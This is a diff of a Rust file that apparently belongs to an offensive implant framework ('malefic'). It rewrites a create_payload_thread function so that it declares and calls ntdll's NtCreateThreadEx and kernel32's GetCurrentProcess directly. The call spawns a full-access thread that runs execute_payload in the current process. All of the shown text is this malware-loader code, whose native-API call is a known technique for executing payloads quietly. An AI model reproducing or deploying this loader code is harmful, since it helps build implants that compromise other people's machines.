@@ -1,28 +1,49 @@
-use std::{thread, ptr};
+use std::thread;
+
+#[cfg(feature = "native_thread")]
+#[link(name = "kernel32")]
+extern "system" {
+    fn GetCurrentProcess() -> *mut core::ffi::c_void;
+}
+
+#[cfg(feature = "native_thread")]
+#[link(name = "ntdll")]
+extern "system" {
+    fn NtCreateThreadEx(
+        thread_handle: *mut *mut core::ffi::c_void,
+        desired_access: u32,
+        object_attributes: *mut core::ffi::c_void,
+        process_handle: *mut core::ffi::c_void,
+        start_routine: *mut core::ffi::c_void,
+        argument: *mut core::ffi::c_void,
+        create_flags: u32,
+        zero_bits: usize,
+        stack_size: usize,
+        maximum_stack_size: usize,
+        attribute_list: *mut core::ffi::c_void,
+    ) -> i32;
+}
 
 /// Thread creation interface with feature-based overrides
 #[cfg(feature = "native_thread")]
 pub fn create_payload_thread() {
-    use malefic_os_win::kit::apis::{m_nt_create_thread_ex, m_get_current_process};
-
     unsafe {
-        let mut thread_handle: *mut core::ffi::c_void = ptr::null_mut();
-        let thread_handle_ptr: *mut core::ffi::c_void = &mut thread_handle as *mut _ as *mut core::ffi::c_void;
-        let current_process = m_get_current_process();
+        let mut thread_handle: *mut core::ffi::c_void = core::ptr::null_mut();
+        let current_process = GetCurrentProcess();
         let start_routine = execute_payload as *const () as *mut core::ffi::c_void;
 
-        let ret = m_nt_create_thread_ex(
-            thread_handle_ptr,      // ThreadHandle
+        let ret = NtCreateThreadEx(
+            &mut thread_handle,     // ThreadHandle
             0x1FFFFF,               // DesiredAccess (THREAD_ALL_ACCESS)
-            ptr::null_mut(),        // ObjectAttributes
+            core::ptr::null_mut(),  // ObjectAttributes
             current_process,        // ProcessHandle
             start_routine,          // StartAddress
-            ptr::null_mut(),        // StartParameter
+            core::ptr::null_mut(),  // StartParameter
             0,                      // CreateSuspended (FALSE)
             0,                      // StackZeroBits
             0,                      // SizeOfStackCommit
             0,                      // SizeOfStackReserve
-            ptr::null_mut(),        // AttributeList
+            core::ptr::null_mut(),  // AttributeList
         );
 
         // NT_SUCCESS(ret) means ret == 0
